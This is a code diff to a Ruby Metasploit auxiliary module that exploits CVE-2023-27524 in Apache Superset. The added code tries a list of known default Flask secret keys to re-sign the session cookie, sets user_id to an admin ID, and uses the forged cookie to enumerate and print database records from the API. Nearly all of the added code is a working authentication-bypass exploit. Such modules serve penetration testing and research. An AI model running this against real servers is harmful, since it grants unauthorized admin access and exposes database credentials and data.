@@ -18,19 +18,26 @@ class MetasploitModule < Msf::Auxiliary
         'Author' => [
           'h00die', # MSF module
           'paradoxis', #  original flask-unsign tool
-          'zeroSteiner' # flask_unsign implementation
-        ], # MSF flask-unsign library
+          'zeroSteiner' # MSF flask-unsign library
+        ],
+        'References' => [
+          ['URL', 'https://github.com/Paradoxis/Flask-Unsign'],
+          ['URL', 'https://vulcan.io/blog/cve-2023-27524-in-apache-superset-what-you-need-to-know/'],
+          ['URL', 'https://www.horizon3.ai/cve-2023-27524-insecure-default-configuration-in-apache-superset-leads-to-remote-code-execution/'],
+          ['URL', 'https://github.com/horizon3ai/CVE-2023-27524/blob/main/CVE-2023-27524.py'],
+          ['CVE', '2023-27524' ],
+        ],
         'License' => MSF_LICENSE,
         'Actions' => [
           [ 'Sign Cookie', { 'Description' => 'Attempts to login to the site, then change the cookie value' } ],
         ],
-        # https://docs.metasploit.com/docs/development/developing-modules/module-metadata/definition-of-module-reliability-side-effects-and-stability.html
         'Notes' => {
-          'Stability' => [],
+          'Stability' => [CRASH_SAFE],
           'Reliability' => [],
-          'SideEffects' => []
+          'SideEffects' => [IOC_IN_LOGS]
         },
-        'DefaultAction' => 'Sign Cookie'
+        'DefaultAction' => 'Sign Cookie',
+        'DisclosureDate' => '2023-04-25'
       )
     )
     register_options(
@@ -39,7 +46,6 @@ class MetasploitModule < Msf::Auxiliary
         OptString.new('USERNAME', [true, 'The username to authenticate as', nil]),
         OptString.new('PASSWORD', [true, 'The password for the specified username', nil]),
         OptInt.new('ADMIN_ID', [true, 'The ID of an admin account', 1]),
-        OptString.new('SECRET', [true, 'The secret used by flask to sign a cookie', 'CHANGE_ME_TO_A_COMPLEX_RANDOM_SECRET']),
         OptString.new('TARGETURI', [ true, 'Relative URI of MantisBT installation', '/'])
       ]
     )
@@ -64,6 +70,34 @@ class MetasploitModule < Msf::Auxiliary
     end
   end
 
+  def valid_cookie(decoded_cookie)
+    [
+      "\x02\x01thisismyscretkey\x01\x02\\e\\y\\y\\h", # version < 1.4.1
+      'CHANGE_ME_TO_A_COMPLEX_RANDOM_SECRET',          # version >= 1.4.1
+      'thisISaSECRET_1234',                            # deployment template
+      'YOUR_OWN_RANDOM_GENERATED_SECRET_KEY',          # documentation
+      'TEST_NON_DEV_SECRET'                            # docker compose
+    ].each do |secret|
+      print_status("Attempting to resign with key: #{secret}")
+      encoded_cookie = Msf::Exploit::Remote::HTTP::FlaskUnsign::Session.sign(decoded_cookie, secret)
+      print_status("#{peer} - New signed cookie: #{encoded_cookie}")
+      cookie_jar.clear
+      res = send_request_cgi(
+        'uri' => normalize_uri(target_uri.path, 'api', 'v1', 'me', '/'),
+        'cookie' => "session=#{encoded_cookie};",
+        'keep_cookies' => true
+      )
+      fail_with(Failure::Unreachable, "#{peer} - Could not connect to web service - no response") if res.nil?
+      if res.code == 401
+        print_bad("#{peer} - Cookie not accepted")
+        next
+      end
+      data = JSON.parse(res.body)
+      print_good("#{peer} - Cookie validated to user: #{data['result']['username']}")
+      return encoded_cookie
+    end
+  end
+
   def run
     res = send_request_cgi!({
       'uri' => normalize_uri(target_uri.path, 'login'),
@@ -78,11 +112,12 @@ class MetasploitModule < Msf::Auxiliary
     vprint_status("#{peer} - CSRF Token: #{csrf_token}")
     cookie = res.get_cookies.to_s
     print_status("#{peer} - Initial Cookie: #{cookie}")
-    decoded_cookie = FlaskUnsign::Session.decode(cookie.split('=')[1].gsub(';', ''))
+    decoded_cookie = Msf::Exploit::Remote::HTTP::FlaskUnsign::Session.decode(cookie.split('=')[1].gsub(';', ''))
     print_status("#{peer} - Decoded Cookie: #{decoded_cookie}")
-    print_status('Attempting login')
-    res = send_request_cgi!({
+    print_status("#{peer} - Attempting login")
+    res = send_request_cgi({
       'uri' => normalize_uri(target_uri.path, 'login', '/'),
+      'keep_cookies' => true,
       'method' => 'POST',
       'ctype' => 'application/x-www-form-urlencoded',
       'vars_post' => {
@@ -93,5 +128,26 @@ class MetasploitModule < Msf::Auxiliary
     })
     fail_with(Failure::Unreachable, "#{peer} - Could not connect to web service - no response") if res.nil?
     fail_with(Failure::NoAccess, "#{peer} - Failed login") if res.body.include? 'Sign In'
+    cookie = res.get_cookies.to_s
+    print_good("#{peer} - Logged in Cookie: #{cookie}")
+    decoded_cookie = Msf::Exploit::Remote::HTTP::FlaskUnsign::Session.decode(cookie.split('=')[1].gsub(';', ''))
+    decoded_cookie['user_id'] = datastore['ADMIN_ID']
+    print_status("#{peer} - Modified cookie: #{decoded_cookie}")
+    admin_cookie = valid_cookie(decoded_cookie)
+
+    fail_with(Failure::NoAccess, "#{peer} - Unable to sign cookie with a valid secret") if admin_cookie.nil?
+    (1..101).each do |i|
+      res = send_request_cgi(
+        'uri' => normalize_uri(target_uri.path, 'api', 'v1', 'database', i),
+        'cookie' => "session=#{admin_cookie};",
+        'keep_cookies' => true
+      )
+      fail_with(Failure::Unreachable, "#{peer} - Could not connect to web service - no response") if res.nil?
+      if res.code == 401 || res.code == 404
+        print_status('Done enumerating databases')
+        break
+      end
+      puts res.body
+    end
   end
 end
